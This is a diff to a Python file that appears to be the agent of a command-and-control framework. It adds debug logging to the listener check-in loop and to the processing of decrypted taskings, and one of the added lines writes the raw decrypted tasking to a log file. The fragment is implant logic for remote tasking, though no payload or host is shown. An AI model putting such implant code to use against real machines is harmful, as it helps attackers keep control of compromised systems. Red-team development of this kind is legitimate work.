@@ -98,14 +98,14 @@ def send_message(data = None):
         time.sleep(sleepTime)
 
         with open("agent.log","a") as fh:
-            fh.write("trying listener {}\n".format(listener))
+            fh.write("trying listener {}\n".format(listener['name']))
         #use the sending function defined in the listener dict
         (code,data) = listener['send_func'](data, **listener['fixed_parameters'])
 
         if code == '200': #we got a message through
             
             with open("agent.log","a") as fh:
-                fh.write("listener {} answered\n".format(listener))
+                fh.write("listener {} answered\n".format(listener['name']))
 
             try:
                 send_job_message_buffer()
@@ -123,7 +123,7 @@ def send_message(data = None):
         else: #update missedCheckins for this listener
 
             with open("agent.log","a") as fh:
-                fh.write("listener {} didn't answer\n".format(listener))
+                fh.write("listener {} didn't answer\n".format(listener['name']))
 
             listener['missedCheckins'] += 1
 
@@ -237,13 +237,23 @@ def process_tasking(data):
     try:
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
+        with open("agent.log","a") as fh:
+            fh.write("got tasking")
+            fh.write(tasking)
+
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
         
+        with open("agent.log","a") as fh:
+            fh.write("got a packet")
+            fh.write("curlistener missedcheckins")
+
         # if we get to this point, we have a legit tasking so reset missedCheckins
         missedCheckins = 0
 
         # execute/process the packets and get any response
         resultPackets = ""
+        with open("agent.log","a") as fh:
+            fh.write("calling processpacket")
         result = process_packet(packetType, data, resultID)
 
         if result:
@@ -289,6 +299,8 @@ def process_packet(packetType, data, resultID):
     except Exception as e:
         return None
 
+    with open("agent.log","a") as fh:
+        fh.write("packetType:{}".format(packetType))
     if packetType == 1:
         # sysinfo request
         # get_sysinfo should be exposed from stager.py
